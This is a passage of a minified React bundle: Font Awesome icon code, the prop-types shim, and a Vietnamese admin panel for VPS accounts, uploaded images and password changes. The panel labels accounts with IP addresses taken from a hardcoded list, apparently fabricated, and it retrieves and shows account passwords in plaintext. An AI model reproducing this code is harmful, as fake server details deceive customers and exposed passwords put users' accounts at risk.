                    d: "M156.5,447.7l-12.6,29.5c-18.7-9.5-35.9-21.2-51.5-34.9l22.7-22.7C127.6,430.5,141.5,440,156.5,447.7z M40.6,272H8.5 c1.4,21.2,5.4,41.7,11.7,61.1L50,321.2C45.1,305.5,41.8,289,40.6,272z M40.6,240c1.4-18.8,5.2-37,11.1-54.1l-29.5-12.6 C14.7,194.3,10,216.7,8.5,240H40.6z M64.3,156.5c7.8-14.9,17.2-28.8,28.1-41.5L69.7,92.3c-13.7,15.6-25.5,32.8-34.9,51.5 L64.3,156.5z M397,419.6c-13.9,12-29.4,22.3-46.1,30.4l11.9,29.8c20.7-9.9,39.8-22.6,56.9-37.6L397,419.6z M115,92.4 c13.9-12,29.4-22.3,46.1-30.4l-11.9-29.8c-20.7,9.9-39.8,22.6-56.8,37.6L115,92.4z M447.7,355.5c-7.8,14.9-17.2,28.8-28.1,41.5 l22.7,22.7c13.7-15.6,25.5-32.9,34.9-51.5L447.7,355.5z M471.4,272c-1.4,18.8-5.2,37-11.1,54.1l29.5,12.6 c7.5-21.1,12.2-43.5,13.6-66.8H471.4z M321.2,462c-15.7,5-32.2,8.2-49.2,9.4v32.1c21.2-1.4,41.7-5.4,61.1-11.7L321.2,462z M240,471.4c-18.8-1.4-37-5.2-54.1-11.1l-12.6,29.5c21.1,7.5,43.5,12.2,66.8,13.6V471.4z M462,190.8c5,15.7,8.2,32.2,9.4,49.2h32.1 c-1.4-21.2-5.4-41.7-11.7-61.1L462,190.8z M92.4,397c-12-13.9-22.3-29.4-30.4-46.1l-29.8,11.9c9.9,20.7,22.6,39.8,37.6,56.9 L92.4,397z M272,40.6c18.8,1.4,36.9,5.2,54.1,11.1l12.6-29.5C317.7,14.7,295.3,10,272,8.5V40.6z M190.8,50 c15.7-5,32.2-8.2,49.2-9.4V8.5c-21.2,1.4-41.7,5.4-61.1,11.7L190.8,50z M442.3,92.3L419.6,115c12,13.9,22.3,29.4,30.5,46.1 l29.8-11.9C470,128.5,457.3,109.4,442.3,92.3z M397,92.4l22.7-22.7c-15.6-13.7-32.8-25.5-51.5-34.9l-12.6,29.5 C370.4,72.1,384.4,81.5,397,92.4z"
                }
            });
            const o = {
                ...a,
                attributeName: "opacity"
            }
              , i = {
                tag: "circle",
                attributes: {
                    ...r,
                    cx: "256",
                    cy: "364",
                    r: "28"
                },
                children: []
            };
            return t || i.children.push({
                tag: "animate",
                attributes: {
                    ...a,
                    attributeName: "r",
                    values: "28;14;28;28;14;28;"
                }
            }, {
                tag: "animate",
                attributes: {
                    ...o,
                    values: "1;0;1;1;0;1;"
                }
            }),
            n.push(i),
            n.push({
                tag: "path",
                attributes: {
                    ...r,
                    opacity: "1",
                    d: "M263.7,312h-16c-6.6,0-12-5.4-12-12c0-71,77.4-63.9,77.4-107.8c0-20-17.8-40.2-57.4-40.2c-29.1,0-44.3,9.6-59.2,28.7 c-3.9,5-11.1,6-16.2,2.4l-13.1-9.2c-5.6-3.9-6.9-11.8-2.6-17.2c21.2-27.2,46.4-44.7,91.2-44.7c52.3,0,97.4,29.8,97.4,80.2 c0,67.6-77.4,63.5-77.4,107.8C275.7,306.6,270.3,312,263.7,312z"
                },
                children: t ? [] : [{
                    tag: "animate",
                    attributes: {
                        ...o,
                        values: "1;0;0;0;0;1;"
                    }
                }]
            }),
            t || n.push({
                tag: "path",
                attributes: {
                    ...r,
                    opacity: "0",
                    d: "M232.5,134.5l7,168c0.3,6.4,5.6,11.5,12,11.5h9c6.4,0,11.7-5.1,12-11.5l7-168c0.3-6.8-5.2-12.5-12-12.5h-23 C237.7,122,232.2,127.7,232.5,134.5z"
                },
                children: [{
                    tag: "animate",
                    attributes: {
                        ...o,
                        values: "0;0;1;1;0;0;"
                    }
                }]
            }),
            {
                tag: "g",
                attributes: {
                    class: "missing"
                },
                children: n
            }
        }
    }
}
  , R3 = {
    hooks() {
        return {
            parseNodeAttributes(e, t) {
                const n = t.getAttribute("data-fa-symbol")
                  , r = n === null ? !1 : n === "" ? !0 : n;
                return e.symbol = r,
                e
            }
        }
    }
}
  , A3 = [P4, g3, y3, v3, x3, j3, E3, _3, P3, O3, R3];
V4(A3, {
    mixoutsTo: hn
});
hn.noAuto;
hn.config;
hn.library;
hn.dom;
const Uc = hn.parse;
hn.findIconDefinition;
hn.toHtml;
const L3 = hn.icon;
hn.layer;
hn.text;
hn.counter;
var C1 = {
    exports: {}
}
  , I3 = "SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED"
  , M3 = I3
  , D3 = M3;
function k1() {}
function j1() {}
j1.resetWarningCache = k1;
var z3 = function() {
    function e(r, a, o, i, s, u) {
        if (u !== D3) {
            var c = new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");
            throw c.name = "Invariant Violation",
            c
        }
    }
    e.isRequired = e;
    function t() {
        return e
    }
    var n = {
        array: e,
        bigint: e,
        bool: e,
        func: e,
        number: e,
        object: e,
        string: e,
        symbol: e,
        any: e,
        arrayOf: t,
        element: e,
        elementType: e,
        instanceOf: t,
        node: e,
        objectOf: t,
        oneOf: t,
        oneOfType: t,
        shape: t,
        exact: t,
        checkPropTypes: j1,
        resetWarningCache: k1
    };
    return n.PropTypes = n,
    n
};
C1.exports = z3();
var F3 = C1.exports;
const He = hi(F3);
function Ph(e, t) {
    var n = Object.keys(e);
    if (Object.getOwnPropertySymbols) {
        var r = Object.getOwnPropertySymbols(e);
        t && (r = r.filter(function(a) {
            return Object.getOwnPropertyDescriptor(e, a).enumerable
        })),
        n.push.apply(n, r)
    }
    return n
}
function An(e) {
    for (var t = 1; t < arguments.length; t++) {
        var n = arguments[t] != null ? arguments[t] : {};
        t % 2 ? Ph(Object(n), !0).forEach(function(r) {
            La(e, r, n[r])
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : Ph(Object(n)).forEach(function(r) {
            Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(n, r))
        })
    }
    return e
}
function el(e) {
    "@babel/helpers - typeof";
    return el = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(t) {
        return typeof t
    }
    : function(t) {
        return t && typeof Symbol == "function" && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
    }
    ,
    el(e)
}
function La(e, t, n) {
    return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
    }) : e[t] = n,
    e
}
function U3(e, t) {
    if (e == null)
        return {};
    var n = {}, r = Object.keys(e), a, o;
    for (o = 0; o < r.length; o++)
        a = r[o],
        !(t.indexOf(a) >= 0) && (n[a] = e[a]);
    return n
}
function B3(e, t) {
    if (e == null)
        return {};
    var n = U3(e, t), r, a;
    if (Object.getOwnPropertySymbols) {
        var o = Object.getOwnPropertySymbols(e);
        for (a = 0; a < o.length; a++)
            r = o[a],
            !(t.indexOf(r) >= 0) && Object.prototype.propertyIsEnumerable.call(e, r) && (n[r] = e[r])
    }
    return n
}
function Bc(e) {
    return $3(e) || H3(e) || V3(e) || W3()
}
function $3(e) {
    if (Array.isArray(e))
        return $c(e)
}
function H3(e) {
    if (typeof Symbol < "u" && e[Symbol.iterator] != null || e["@@iterator"] != null)
        return Array.from(e)
}
function V3(e, t) {
    if (e) {
        if (typeof e == "string")
            return $c(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        if (n === "Object" && e.constructor && (n = e.constructor.name),
        n === "Map" || n === "Set")
            return Array.from(e);
        if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
            return $c(e, t)
    }
}
function $c(e, t) {
    (t == null || t > e.length) && (t = e.length);
    for (var n = 0, r = new Array(t); n < t; n++)
        r[n] = e[n];
    return r
}
function W3() {
    throw new TypeError(`Invalid attempt to spread non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
}
function K3(e) {
    var t, n = e.beat, r = e.fade, a = e.beatFade, o = e.bounce, i = e.shake, s = e.flash, u = e.spin, c = e.spinPulse, f = e.spinReverse, d = e.pulse, h = e.fixedWidth, N = e.inverse, y = e.border, S = e.listItem, x = e.flip, g = e.size, p = e.rotation, m = e.pull, C = (t = {
        "fa-beat": n,
        "fa-fade": r,
        "fa-beat-fade": a,
        "fa-bounce": o,
        "fa-shake": i,
        "fa-flash": s,
        "fa-spin": u,
        "fa-spin-reverse": f,
        "fa-spin-pulse": c,
        "fa-pulse": d,
        "fa-fw": h,
        "fa-inverse": N,
        "fa-border": y,
        "fa-li": S,
        "fa-flip": x === !0,
        "fa-flip-horizontal": x === "horizontal" || x === "both",
        "fa-flip-vertical": x === "vertical" || x === "both"
    },
    La(t, "fa-".concat(g), typeof g < "u" && g !== null),
    La(t, "fa-rotate-".concat(p), typeof p < "u" && p !== null && p !== 0),
    La(t, "fa-pull-".concat(m), typeof m < "u" && m !== null),
    La(t, "fa-swap-opacity", e.swapOpacity),
    t);
    return Object.keys(C).map(function(k) {
        return C[k] ? k : null
    }).filter(function(k) {
        return k
    })
}
function G3(e) {
    return e = e - 0,
    e === e
}
function E1(e) {
    return G3(e) ? e : (e = e.replace(/[\-_\s]+(.)?/g, function(t, n) {
        return n ? n.toUpperCase() : ""
    }),
    e.substr(0, 1).toLowerCase() + e.substr(1))
}
var Y3 = ["style"];
function Q3(e) {
    return e.charAt(0).toUpperCase() + e.slice(1)
}
function X3(e) {
    return e.split(";").map(function(t) {
        return t.trim()
    }).filter(function(t) {
        return t
    }).reduce(function(t, n) {
        var r = n.indexOf(":")
          , a = E1(n.slice(0, r))
          , o = n.slice(r + 1).trim();
        return a.startsWith("webkit") ? t[Q3(a)] = o : t[a] = o,
        t
    }, {})
}
function _1(e, t) {
    var n = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {};
    if (typeof t == "string")
        return t;
    var r = (t.children || []).map(function(u) {
        return _1(e, u)
    })
      , a = Object.keys(t.attributes || {}).reduce(function(u, c) {
        var f = t.attributes[c];
        switch (c) {
        case "class":
            u.attrs.className = f,
            delete t.attributes.class;
            break;
        case "style":
            u.attrs.style = X3(f);
            break;
        default:
            c.indexOf("aria-") === 0 || c.indexOf("data-") === 0 ? u.attrs[c.toLowerCase()] = f : u.attrs[E1(c)] = f
        }
        return u
    }, {
        attrs: {}
    })
      , o = n.style
      , i = o === void 0 ? {} : o
      , s = B3(n, Y3);
    return a.attrs.style = An(An({}, a.attrs.style), i),
    e.apply(void 0, [t.tag, An(An({}, a.attrs), s)].concat(Bc(r)))
}
var T1 = !1;
try {
    T1 = !0
} catch {}
function q3() {
    if (!T1 && console && typeof console.error == "function") {
        var e;
        (e = console).error.apply(e, arguments)
    }
}
function Oh(e) {
    if (e && el(e) === "object" && e.prefix && e.iconName && e.icon)
        return e;
    if (Uc.icon)
        return Uc.icon(e);
    if (e === null)
        return null;
    if (e && el(e) === "object" && e.prefix && e.iconName)
        return e;
    if (Array.isArray(e) && e.length === 2)
        return {
            prefix: e[0],
            iconName: e[1]
        };
    if (typeof e == "string")
        return {
            prefix: "fas",
            iconName: e
        }
}
function wu(e, t) {
    return Array.isArray(t) && t.length > 0 || !Array.isArray(t) && t ? La({}, e, t) : {}
}
var Rh = {
    border: !1,
    className: "",
    mask: null,
    maskId: null,
    fixedWidth: !1,
    inverse: !1,
    flip: !1,
    icon: null,
    listItem: !1,
    pull: null,
    pulse: !1,
    rotation: null,
    size: null,
    spin: !1,
    spinPulse: !1,
    spinReverse: !1,
    beat: !1,
    fade: !1,
    beatFade: !1,
    bounce: !1,
    shake: !1,
    symbol: !1,
    title: "",
    titleId: null,
    transform: null,
    swapOpacity: !1
}
  , ue = Gc.forwardRef(function(e, t) {
    var n = An(An({}, Rh), e)
      , r = n.icon
      , a = n.mask
      , o = n.symbol
      , i = n.className
      , s = n.title
      , u = n.titleId
      , c = n.maskId
      , f = Oh(r)
      , d = wu("classes", [].concat(Bc(K3(n)), Bc((i || "").split(" "))))
      , h = wu("transform", typeof n.transform == "string" ? Uc.transform(n.transform) : n.transform)
      , N = wu("mask", Oh(a))
      , y = L3(f, An(An(An(An({}, d), h), N), {}, {
        symbol: o,
        title: s,
        titleId: u,
        maskId: c
    }));
    if (!y)
        return q3("Could not find icon", f),
        null;
    var S = y.abstract
      , x = {
        ref: t
    };
    return Object.keys(n).forEach(function(g) {
        Rh.hasOwnProperty(g) || (x[g] = n[g])
    }),
    J3(S[0], x)
});
ue.displayName = "FontAwesomeIcon";
ue.propTypes = {
    beat: He.bool,
    border: He.bool,
    beatFade: He.bool,
    bounce: He.bool,
    className: He.string,
    fade: He.bool,
    flash: He.bool,
    mask: He.oneOfType([He.object, He.array, He.string]),
    maskId: He.string,
    fixedWidth: He.bool,
    inverse: He.bool,
    flip: He.oneOf([!0, !1, "horizontal", "vertical", "both"]),
    icon: He.oneOfType([He.object, He.array, He.string]),
    listItem: He.bool,
    pull: He.oneOf(["right", "left"]),
    pulse: He.bool,
    rotation: He.oneOf([0, 90, 180, 270]),
    shake: He.bool,
    size: He.oneOf(["2xs", "xs", "sm", "lg", "xl", "2xl", "1x", "2x", "3x", "4x", "5x", "6x", "7x", "8x", "9x", "10x"]),
    spin: He.bool,
    spinPulse: He.bool,
    spinReverse: He.bool,
    symbol: He.oneOfType([He.bool, He.string]),
    title: He.string,
    titleId: He.string,
    transform: He.oneOfType([He.string, He.object]),
    swapOpacity: He.bool
};
var J3 = _1.bind(null, Gc.createElement);
const Z3 = () => {
    const [e,t] = j.useState(!1)
      , [n,r] = j.useState("")
      , [a,o] = j.useState(!1)
      , [i,s] = j.useState(null)
      , [u,c] = j.useState({
        username: "",
        password: ""
    })
      , f = h => {
        const {name: N, value: y} = h.target;
        c(S => ({
            ...S,
            [N]: y
        }))
    }
      , d = async h => {
        h.preventDefault(),
        t(!0),
        r("");
        try {
            if (u.username === "admin") {
                s("Không thể đổi mật khẩu của admin"),
                t(!1);
                return
            }
            const N = localStorage.getItem("token");
            await Ee.post("/api/admin/change-password", u, {
                headers: {
                    Authorization: `Bearer ${N}`
                }
            }),
            r("Thông tin tài khoản đã được cập nhật")
        } catch (N) {
            console.error("Failed to update account:", N),
            s("Không thể cập nhật thông tin tài khoản")
        } finally {
            t(!1)
        }
    }
    ;
    return l.jsxs("div", {
        className: "relative",
        children: [l.jsx("div", {
            className: "absolute -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-purple-100/10"
        }), l.jsx("div", {
            className: "absolute right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-pink-100/10"
        }), l.jsx("div", {
            className: "absolute bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-purple-100/10"
        }), i && l.jsx(El, {
            message: i,
            onClose: () => s(null)
        }), l.jsx("div", {
            className: "relative mx-auto max-w-2xl animate-fade-in",
            children: l.jsx("div", {
                className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                children: l.jsxs("div", {
                    className: "relative rounded-2xl bg-white p-4 shadow-2xl sm:p-8",
                    children: [l.jsx("div", {
                        className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                    }), l.jsx("div", {
                        className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                    }), l.jsxs("div", {
                        className: "relative space-y-6",
                        children: [l.jsxs("div", {
                            className: "flex flex-col items-center gap-3 sm:flex-row",
                            children: [l.jsx("div", {
                                className: "rounded-full bg-gradient-to-r from-purple-600 to-pink-500 p-2",
                                children: l.jsx(ue, {
                                    icon: fi,
                                    className: "text-2xl text-white"
                                })
                            }), l.jsx("h1", {
                                className: "text-center text-2xl font-bold text-purple-900 sm:text-left",
                                children: "Thông Tin Tài Khoản"
                            })]
                        }), l.jsxs("form", {
                            onSubmit: d,
                            className: "space-y-4",
                            children: [l.jsxs("div", {
                                children: [l.jsx("label", {
                                    htmlFor: "username",
                                    className: "block text-sm font-medium text-purple-700",
                                    children: "Tên Đăng Nhập"
                                }), l.jsx("input", {
                                    type: "text",
                                    id: "username",
                                    name: "username",
                                    value: u.username,
                                    onChange: f,
                                    className: "mt-1 block w-full rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200",
                                    placeholder: "Nhập tên đăng nhập",
                                    autoFocus: !0
                                })]
                            }), l.jsxs("div", {
                                children: [l.jsx("label", {
                                    htmlFor: "password",
                                    className: "block text-sm font-medium text-purple-700",
                                    children: "Mật Khẩu"
                                }), l.jsxs("div", {
                                    className: "relative mt-1",
                                    children: [l.jsx("input", {
                                        type: a ? "text" : "password",
                                        id: "password",
                                        name: "password",
                                        value: u.password,
                                        onChange: f,
                                        className: "block w-full rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200",
                                        placeholder: "Nhập mật khẩu"
                                    }), l.jsx("button", {
                                        type: "button",
                                        onClick: () => o(!a),
                                        className: "absolute right-3 top-1/2 -translate-y-1/2 transform text-purple-400 hover:text-purple-600",
                                        children: l.jsx(ue, {
                                            icon: a ? Ys : Xs
                                        })
                                    })]
                                })]
                            }), l.jsx("button", {
                                type: "submit",
                                disabled: e,
                                className: "group relative w-full overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 font-medium text-white transition-all duration-200 hover:shadow-lg hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 disabled:opacity-50",
                                children: e ? "Đang cập nhật..." : "Lưu Thay Đổi"
                            })]
                        }), n && l.jsx("div", {
                            className: `animate-fade-in rounded-xl p-4 backdrop-blur-sm ${n.includes("Không thể") ? "border border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-pink-50/80 to-rose-50/80 text-purple-700" : "border border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-blue-50/80 to-emerald-50/80 text-purple-700"}`,
                            children: l.jsxs("div", {
                                className: "flex items-center gap-2",
                                children: [l.jsx(ue, {
                                    icon: n.includes("Không thể") ? Xr : oo,
                                    className: "text-purple-500"
                                }), l.jsx("span", {
                                    className: "font-medium",
                                    children: n
                                })]
                            })
                        })]
                    })]
                })
            })
        })]
    })
}
  , Ah = ({checked: e, onChange: t, selectAll: n}) => l.jsxs("label", {
    className: "group flex cursor-pointer items-center",
    children: [l.jsxs("div", {
        className: "relative",
        children: [l.jsx("input", {
            type: "checkbox",
            className: "sr-only",
            checked: e,
            onChange: t,
            tabIndex: -1
        }), l.jsx("div", {
            className: "h-5 w-5 rounded border border-gray-300 bg-white transition-all duration-200 group-hover:border-purple-500",
            children: l.jsx("div", {
                className: `absolute inset-0 flex items-center justify-center transition-all duration-200 ${e ? "opacity-100" : "opacity-0"}`,
                children: l.jsx("div", {
                    className: "h-3 w-3 rounded-sm bg-gradient-to-r from-purple-600 to-pink-500",
                    children: l.jsx(ue, {
                        icon: oo,
                        className: "h-3 w-3 text-white"
                    })
                })
            })
        })]
    }), n && l.jsx("span", {
        className: "ml-2 select-none text-sm text-gray-600",
        children: e ? "Bỏ chọn tất cả" : "Chọn tất cả"
    })]
})
  , e6 = () => {
    const [e,t] = j.useState("vps")
      , [n,r] = j.useState([])
      , [a,o] = j.useState("")
      , [i,s] = j.useState("")
      , [u,c] = j.useState("")
      , [f,d] = j.useState(null)
      , [h,N] = j.useState(!1)
      , y = localStorage.getItem("token")
      , S = Dr()
      , [x,g] = j.useState({
        isOpen: !1,
        userName: ""
    })
      , [p,m] = j.useState({
        message: null,
        type: "info"
    })
      , C = j.useRef(null)
      , [k,w] = j.useState("")
      , [A,P] = j.useState("name")
      , [K,$] = j.useState("asc")
      , [Se,Te] = j.useState(0)
      , [Ae,H] = j.useState(!1)
      , [X,J] = j.useState(!1)
      , [Q,V] = j.useState([])
      , [le,z] = j.useState("")
      , [M,Y] = j.useState(1)
      , [ge] = j.useState(12)
      , [W,b] = j.useState({
        isOpen: !1,
        filename: ""
    })
      , [xe,ce] = j.useState({})
      , [Ne,$e] = j.useState(!1)
      , [Ue,Ce] = j.useState(!1)
      , [Me,tt] = j.useState({
        isOpen: !1,
        image: null
    })
      , Xe = L => [...L].sort( (ne, wt) => {
        if (A === "stt")
            return K === "asc" ? 1 : -1;
        const ct = ne[A]
          , mt = wt[A];
        return K === "asc" ? String(ct).localeCompare(String(mt)) : String(mt).localeCompare(String(ct))
    }
    )
      , O = L => L.filter(ne => ne.name.toLowerCase().includes(k.toLowerCase()) || ne.username.toLowerCase().includes(k.toLowerCase()) || ne.ip.toLowerCase().includes(k.toLowerCase()))
      , U = j.useCallback(async () => {
        try {
            const L = await Ee.get("/api/admin/get-list-user", {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            })
              , ne = ["203.160.0.34", "203.160.1.72", "203.160.5.231", "203.160.6.88", "203.160.7.19", "203.160.8.203", "203.160.10.150", "203.160.12.47", "203.160.15.223", "203.160.17.66", "14.162.1.112", "14.162.3.65", "14.162.4.239", "14.162.5.188", "14.162.6.99", "14.162.7.144", "14.162.8.53", "14.162.10.230", "14.162.12.19", "14.162.15.95", "27.68.2.171", "27.68.3.214", "27.68.4.47", "27.68.5.131", "27.68.7.200", "27.68.8.36", "27.68.9.110", "27.68.11.222", "27.68.12.67", "27.68.15.245", "171.224.3.158", "171.224.4.22", "171.224.6.99", "171.224.8.199", "171.224.10.55", "171.224.12.34", "171.224.14.176"]
              , wt = L.data.map( (ct, mt) => ({
                name: ct[0],
                username: ct[1],
                password: ct[2],
                ip: mt < ne.length ? ne[mt] : ""
            }));
            r(wt),
            Te(wt.length)
        } catch (L) {
            console.error("Failed to fetch users:", L)
        }
    }
    , [y]);
    j.useEffect( () => {
        U()
    }
    , [U]);
    const ae = async () => {
        var L;
        if (!a.trim()) {
            m({
                message: "Vui lòng nhập tên VPS",
                type: "info"
            }),
            (L = C.current) == null || L.focus();
            return
        }
        if (Se >= 10) {
            m({
                message: "Không đủ VPS để khởi tạo, vui lòng xoá hoặc mua thêm VPS",
                type: "info"
            }),
            window.open("https://ovfteam.com/", "_blank");
            return
        }
        try {
            await Ee.post("/api/admin/add-user", {
                name: a
            }, {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            }),
            o(""),
            U()
        } catch (ne) {
            console.error("Failed to add user:", ne),
            m({
                message: "Không thể thêm VPS",
                type: "error"
            })
        }
    }
      , je = async (L, ne, wt) => {
        try {
            await Ee.post("/api/admin/change-password", {
                name: L,
                username: ne,
                password: wt
            }, {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            }),
            d(null),
            U()
        } catch (ct) {
            console.error("Failed to change password:", ct)
        }
    }
      , be = async () => {
        try {
            await Ee.post("/api/admin/change-password", {
                username: i,
                password: u
            }, {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            })
        } catch (L) {
            console.error("Failed to change info:", L)
        }
    }
      , _e = () => {
        localStorage.removeItem("token"),
        window.location.href = "/admin"
    }
    ;
    j.useEffect( () => {
        Ee.post("/api/admin/check-token", {}, {
            headers: {
                Authorization: `Bearer ${y}`
            }
        }).then(L => {
            L.data.is_admin || S("/admin/dashboard")
        }
        ).catch( () => {
            localStorage.removeItem("token"),
            S("/admin")
        }
        )
    }
    , [S, y]);
    const Oe = async L => {
        N(!0);
        try {
            const ne = await Ee.post("/api/admin/get-info", {
                name: L.name
            }, {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            });
            d({
                name: L.name,
                username: ne.data[0],
                password: ne.data[1],
                ip: L.ip
            })
        } catch (ne) {
            console.error("Failed to fetch user details:", ne)
        } finally {
            N(!1)
        }
    }
    ;
    j.useEffect( () => {
        (async () => {
            if (e === "profile")
                try {
                    const ne = await Ee.post("/api/admin/get-info", {
                        name: "admin"
                    }, {
                        headers: {
                            Authorization: `Bearer ${y}`
                        }
                    });
                    s(ne.data[0]),
                    c(ne.data[1])
                } catch (ne) {
                    console.error("Failed to fetch admin info:", ne)
                }
        }
        )()
    }
    , [e, y]);
    const Ke = async L => {
        g({
            isOpen: !0,
            userName: L
        })
    }
      , q = async () => {
        try {
            await Ee.post("/api/admin/delete-user", {
                name: x.userName
            }, {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            }),
            g({
                isOpen: !1,
                userName: ""
            }),
            U()
        } catch (L) {
            console.error("Failed to delete user:", L)
        }
    }
      , de = L => {
        A === L ? $(ne => ne === "asc" ? "desc" : "asc") : (P(L),
        $("asc"))
    }
      , Re = j.useCallback(async () => {
        try {
            const L = await Ee.get("/api/get-all-images", {
                headers: {
                    Authorization: `Bearer ${y}`
                }
            });
            V(L.data)
        } catch (L) {
            console.error("Failed to fetch images:", L),
            m({
                message: "Không thể tải hình ảnh",
                type: "error"
            })
        }
    }
    , [y])
      , ee = async L => {
        b({
            isOpen: !0,
            filename: L
        })
    }
      , oe = async () => {
        try {
            const L = W.filename.split(", ");
            for (const ne of L)
                await Ee.post("/api/delete-image", {
                    filename: ne
                }, {
                    headers: {
                        Authorization: `Bearer ${y}`
                    }
                });
            b({
                isOpen: !1,
                filename: ""
            }),
            ce({}),
            $e(!1),
            Re(),
            m({
                message: "Xóa hình ảnh thành công",
                type: "success"
            })
        } catch (L) {
            console.error("Failed to delete images:", L),
            m({
                message: "Không thể xóa hình ảnh",
                type: "error"
            })
        }
    }
      , De = async L => {
        var ne;
        try {
            const wt = await Ee.get(`/uploads/${L}`, {
                headers: {
                    Authorization: `Bearer ${y}`
                },
                responseType: "blob"
            })
              , ct = window.URL.createObjectURL(new Blob([wt.data]))
              , mt = document.createElement("a");
            mt.href = ct,
            mt.setAttribute("download", L),
            document.body.appendChild(mt),
            mt.click(),
            (ne = mt.parentNode) == null || ne.removeChild(mt),
            window.URL.revokeObjectURL(ct)
        } catch (wt) {
            console.error("Failed to download image:", wt),
            m({
                message: "Không th tải hình ảnh",
                type: "error"
            })
        }
    }
    ;
    j.useEffect( () => {
        e === "images" && Re()
    }
    , [e, Re]);
    const Pt = () => {
        const L = !Ne;
        $e(L);
        const ne = {};
        Q.forEach(wt => {
            ne[wt.filename] = L
        }
        ),
        ce(ne)
    }
      , ut = L => {
        ce(ne => {
            const wt = {
                ...ne,
                [L]: !ne[L]
            }
              , ct = Q.every(mt => wt[mt.filename]);
            return $e(ct),
            wt
        }
        )
    }
      , Lt = () => Object.values(xe).filter(Boolean).length
      , St = async () => {
        const L = Object.entries(xe).filter( ([,ne]) => ne).map( ([ne]) => ne);
        if (L.length === 0) {
            m({
                message: "Vui lòng chọn ít nhất một hình ảnh",
                type: "info"
            });
            return
        }
        for (const ne of L)
            await De(ne)
    }
      , mn = () => {
        const L = Object.entries(xe).filter( ([,ne]) => ne).map( ([ne]) => ne);
        if (L.length === 0) {
            m({
                message: "Vui lòng chọn ít nhất một hình ảnh",
                type: "info"
            });
            return
        }
        b({
            isOpen: !0,
            filename: L.join(", ")
        })
    }
      , at = L => {
        tt({
            isOpen: !0,
            image: L
        })
    }
    ;
    return l.jsxs("div", {
        className: "fixed inset-0 overflow-y-auto bg-gradient-to-br from-indigo-500 via-purple-600 to-pink-500",
        children: [l.jsxs("div", {
            className: "min-h-screen",
            children: [l.jsx("div", {
                className: "fixed -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-white/20"
            }), l.jsx("div", {
                className: "fixed right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-pink-500/20"
            }), l.jsx("div", {
                className: "fixed bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-indigo-500/20"
            }), l.jsx("div", {
                className: "fixed left-1/4 top-1/4 z-0 h-16 w-16 animate-float-slow rounded-full bg-purple-400/10"
            }), l.jsx("div", {
                className: "fixed right-1/3 top-1/2 z-0 h-20 w-20 animate-float-slower rounded-full bg-pink-400/10"
            }), l.jsx("div", {
                className: "fixed bottom-1/4 left-2/3 z-0 h-28 w-28 animate-float-slowest rounded-full bg-indigo-400/10"
            }), l.jsx("div", {
                className: "fixed right-1/4 top-1/3 z-0 h-4 w-4 animate-pulse rounded-full bg-white/30"
            }), l.jsx("div", {
                className: "fixed bottom-1/3 left-1/2 z-0 h-3 w-3 animate-pulse rounded-full bg-pink-300/30"
            }), l.jsx("div", {
                className: "fixed right-1/2 top-2/3 z-0 h-5 w-5 animate-pulse rounded-full bg-indigo-300/30"
            }), l.jsx("div", {
                className: "fixed left-1/3 top-1/3 z-0 h-36 w-36 animate-float-reverse rounded-full bg-gradient-to-br from-purple-500/20 to-transparent blur-xl"
            }), l.jsx("div", {
                className: "fixed bottom-1/4 right-1/4 z-0 h-48 w-48 animate-float-delayed-reverse rounded-full bg-gradient-to-br from-pink-500/20 to-transparent blur-xl"
            }), l.jsx("div", {
                className: "fixed bottom-1/2 left-1/4 z-0 h-40 w-40 animate-float-slow-reverse rounded-full bg-gradient-to-br from-indigo-500/20 to-transparent blur-xl"
            }), l.jsx("nav", {
                className: "sticky top-0 z-20 bg-white/10 backdrop-blur-lg",
                children: l.jsx("div", {
                    className: "mx-auto max-w-7xl px-4",
                    children: l.jsxs("div", {
                        className: "flex h-16 items-center justify-between",
                        children: [l.jsx("button", {
                            onClick: () => Ce(!0),
                            className: "inline-flex items-center justify-center rounded-md p-2 text-white hover:bg-white/10 sm:hidden",
                            children: l.jsx(ue, {
                                icon: Hg,
                                className: "h-6 w-6"
                            })
                        }), l.jsx("div", {
                            className: "hidden sm:flex sm:space-x-2",
                            children: [{
                                id: "vps",
                                icon: pu,
